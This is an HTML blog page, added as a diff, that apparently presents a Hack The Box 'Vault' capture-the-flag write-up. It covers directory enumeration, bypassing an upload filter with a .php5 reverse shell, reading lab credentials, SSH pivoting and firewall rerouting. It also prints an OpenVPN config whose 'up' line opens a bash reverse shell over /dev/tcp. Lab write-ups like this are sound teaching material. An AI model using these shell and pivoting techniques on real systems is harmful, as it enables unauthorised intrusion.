@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <!-- Non social metatags -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="theme-color" content="#157878">
+
+    
+
+    <title>Htb Vault</title>
+
+    
+      <!-- Update your html tag to include the itemscope and itemtype attributes. -->
+<html itemscope itemtype="http://schema.org/Article">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Place this data between the <head> tags of your website -->
+
+  <meta name="author" content="Srb_">
+
+<meta name="description" content="" />
+
+
+
+
+  <meta name="keywords" itemprop="category" content="">
+
+
+<!-- Schema.org markup for Google+ -->
+<meta itemprop="name" content="Htb Vault">
+<meta itemprop="description" content="">
+
+  <meta itemprop="image" content="http://localhost:4000/">
+
+
+<!-- Twitter Card data -->
+<meta name="twitter:card" content="summary_large_image">
+
+
+
+<meta name="twitter:title" content="Htb Vault">
+<meta name="twitter:description" content="">
+
+
+  <meta name="twitter:creator" content="@srb01246810">
+
+
+<!-- Twitter summary card with large image must be at least 280x150px -->
+
+  <meta name="twitter:image:src" content="http://localhost:4000/">
+  <meta property="twitter:image" content="http://localhost:4000/">
+
+<meta property="twitter:url" content="http://localhost:4000//offsec/2018/11/25/HTB-vault.html">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Htb Vault" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:4000//offsec/2018/11/25/HTB-vault.html" />
+
+  <meta property="og:image" content="http://localhost:4000/" />
+
+<meta property="og:description" content="" />
+<meta property="og:site_name" content="Home" />
+
+  <meta property="article:published_time" content="2018-11-25T00:00:00-05:00" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <meta property="article:tag" content="offsec">
+  
+
+
+
+  <meta property="article:tag" content="">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:4000/offsec/2018/11/25/HTB-vault.html">
+
+    
+
+    <link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
+    <meta name="robots" content="noarchive">
+
+    <!-- <link rel="alternate" media="only screen and (max-width: 640px)" href="">
+    <link rel="alternate" media="handheld" href=""> -->
+
+
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper">
+    
+    
+
+    
+      <a class="site-title" href="/">Home</a>
+    
+
+    
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+              <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+              <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+          
+            
+            
+              
+              
+            
+          
+            
+            
+              
+                <a class="page-link" href="/dev.html">Dev</a>
+              
+            
+          
+            
+            
+          
+            
+            
+              
+                <a class="page-link" href="/offSec.html">OffSec</a>
+              
+            
+          
+            
+            
+          
+        </div>
+      </nav>
+    
+  </div>
+</header>
+
+    
+    
+    
+
+    
+    <div style="padding-top: 10%; text-align: center">
+      <h1 class="project-name">Htb Vault</h1>
+      <h2 class="project-tagline"></h2>
+    </div>
+    
+
+    <section class="main-content">
+
+      <div>
+
+  <p><img src="/assets/images/vault.png" /></p>
+
+<h1 id="vault-101010109">Vault: 10.10.10.109</h1>
+
+<h1 id="recon">Recon:</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u 10.10.10.109 -e *
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: nmap | Threads: 10 | Wordlist size: 6040
+
+Error Log: /home/srbz/git/tools/_web/dirsearch/logs/errors-18-11-13_02-07-01.log
+
+Target: 10.10.10.109
+
+[02:07:01] Starting: 
+[02:07:04] 403 -  298B  - /.ht_wsr.txt
+(...)
+[02:07:50] 200 -  299B  - /index.php[02:07:50] 
+[02:08:10] 200 -  299B  - /index.php/login/
+(...)
+Task Completed
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/index_vault.png" style="width: 100%" /></p>
+
+<p>After few minutes of searching and guessing, you should arrive at this login page.</p>
+
+<p><img src="/assets/images/login_vault.png" style="width: 80%" /></p>
+
+<blockquote>
+  <p>Trying to pass this login page was not the solution. After a while I told my self, what if the index page is saying right for once. So kept enumerating and found new files.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u http://10.10.10.109/sparklays/design -w common.txt -e html,php,txt -f
+
+(...)
+[20:18:43] 200 -   72B  - /sparklays/design/design.html
+(...)
+</code></pre></div></div>
+
+<p>This page was giving access to file upload module, but it had some extension restriction. Replacing the reverse PHP shell extension for <code class="highlighter-rouge">.php5</code> gave me access to the ubuntu host as <code class="highlighter-rouge">www-data</code>.</p>
+
+<h1 id="privesc">PrivEsc</h1>
+
+<p>My first reflex was to check what services were reachable from the internal.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:5902          0.0.0.0:*               LISTEN      -               
+tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
+udp        0      0 192.168.122.1:53        0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:67              0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:58192           0.0.0.0:*                           -               
+udp6       0      0 :::5353                 :::*                                -               
+udp6       0      0 :::48208                :::*                                -   
+</code></pre></div></div>
+
+<p>Note that local IP adress <code class="highlighter-rouge">192.168.122.1:53</code> is on another network. Since nmap was disabled for the <code class="highlighter-rouge">www-data</code> user.</p>
+
+<blockquote>
+  <p>I try to run <code class="highlighter-rouge">socat</code> and <code class="highlighter-rouge">ncat</code> in order to be able to do port forwarding, but they wasn’t installed.</p>
+</blockquote>
+
+<p>Thus, you had to look for something else, something like some broken files left on the desktop that would aloud you to pivote trough ssh! <code class="highlighter-rouge">#EPIC_FAIL</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>key
+itscominghome
+
+<span class="nb">cat</span> /home/dave/Desktop/ssh
+dave
+Dav3therav3123
+
+<span class="nb">cat </span>Servers 
+DNS + Configurator - 192.168.122.4
+Firewall - 192.168.122.5
+The Vault - x
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -fNtD 9050 dave@10.10.10.109 [-L 127.0.0.1:8888:192.168.122.4:80]
+proxychains firefox 192.168.122.4
+</code></pre></div></div>
+
+<p><img src="/assets/images/vault_vpn.jpg" style="width:70%" /></p>
+
+<blockquote>
+  <p>And it’s exactly at this moment when I received a call from Mom asking me what I was doing and I answered: Hmmmmm… not much, hacking VPN Mom.</p>
+</blockquote>
+
+<p>This <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">medium article</a> defines well what is what and how to pop a shell out of it!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remote 192.168.1.245
+ifconfig 10.200.0.2 10.200.0.1
+dev tun
+script-security 2
+up "/bin/bash -c '/bin/bash -i &gt; /dev/tcp/192.168.122.1/8181 0&lt;&amp;1 2&gt;&amp;1&amp;'"
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat ssh
+dave
+dav3gerous567
+
+
+cat user*
+a4***************************3
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>At this point you could have change the root password and connect with ssh using these credentials and found alex’s <code class="highlighter-rouge">.bash_history</code> where you would have seen that he was pinging the <code class="highlighter-rouge">192.168.5.2</code> IP adress. Byt no chance, this adress was no longuer reachable.</p>
+</blockquote>
+
+<p>All the traffic to the Vault was passing trough the  <code class="highlighter-rouge">192.168.122.5</code> firewall. Bypassing firewall was easy. All you had to do was to add another IP adress to the same interface and remove this routing. Then, running a basic nmap scan on this target to unveil the <code class="highlighter-rouge">987/tcp</code> port wich was exposing a ssh service that were using the same cred then the DNS box.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:# route
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun0
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun1
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun2
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun3
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun4
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun5
+192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
+192.168.122.0   *               255.255.255.0   U     0      0        0 ens3
+
+root@DNS:# ip address add 192.168.5.137/24 dev ens3
+root@DNS:# route del -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
+root@DNS:# ping 192.168.5.2
+PING 192.168.5.2 (192.168.5.2) 56(84) bytes of data.
+64 bytes from 192.168.5.2: icmp_seq=1 ttl=64 time=1.56 ms
+</code></pre></div></div>
+
+<h1 id="welcome-to-the-vault">Welcome to the Vault!</h1>
+
+<p>To complete the box, you had to <code class="highlighter-rouge">scp</code> the <code class="highlighter-rouge">root.txt.gpg</code> back to the ubuntu box and pass the key <code class="highlighter-rouge">itscominghome</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You need a passphrase to unlock the secret key for
+user: "david &lt;dave@david.com&gt;"
+4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)
+
+gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
+      "david &lt;dave@david.com&gt;"
+      gpg: .srb: unknown suffix
+      Enter new filename [root.txt]: root.txt
+
+cat root.txt 
+ca4********************819
+</code></pre></div></div>
+
+
+  <h2>Latest Posts</h2>
+
+  <ul class="post-list">
+    
+      - <a href="/offsec/2018/11/25/HTB-vault.html"> Htb Vault</a>
+      <br>
+    
+      - <a href="/offsec/2018/11/13/HTB-curling.html"> Htb Curling</a>
+      <br>
+    
+      - <a href="/offsec/2018/10/21/HTB-active.html"> Htb Active</a>
+      <br>
+    
+      - <a href="/offsec/2018/09/24/HTB-nibbles.html"> Htb Nibbles</a>
+      <br>
+    
+      - <a href="/offsec/2018/09/24/HTB-celestial.html"> Htb Celestial</a>
+      <br>
+    
+      - <a href="/offsec/2018/08/05/Nsec-2018.html"> Nsec 2018</a>
+      <br>
+    
+      - <a href="/offsec/2018/06/25/HTB-valentine.html"> Htb Valentine</a>
+      <br>
+    
+  </ul>
+
+</div>
+
+
+      <footer class="site-footer">
+        <!-- SVG icons from https://iconmonstr.com -->
+
+        <!-- Github icon -->
+        <span class="my-span-icon">
+          <a href="" aria-label="'s GitHub" title="'s GitHub">
+            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+          </a>
+        </span>
+
+        <!-- Twitter icon -->
+        <span class="my-span-icon">
+          <a href="https://twitter.com/srb01246810" aria-label="'s Twitter" title="'s Twitter">
+            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm6.066 9.645c.183 4.04-2.83 8.544-8.164 8.544-1.622 0-3.131-.476-4.402-1.291 1.524.18 3.045-.244 4.252-1.189-1.256-.023-2.317-.854-2.684-1.995.451.086.895.061 1.298-.049-1.381-.278-2.335-1.522-2.304-2.853.388.215.83.344 1.301.359-1.279-.855-1.641-2.544-.889-3.835 1.416 1.738 3.533 2.881 5.92 3.001-.419-1.796.944-3.527 2.799-3.527.825 0 1.572.349 2.096.907.654-.128 1.27-.368 1.824-.697-.215.671-.67 1.233-1.263 1.589.581-.07 1.135-.224 1.649-.453-.384.578-.87 1.084-1.433 1.489z"/></svg>
+          </a>
+        </span>
+
+        <!-- RSS icon -->
+        
+        <!-- Contact icon -->
+        
+        
+
+      </footer>
+    </section>
+
+    
+  </body>
+</html>
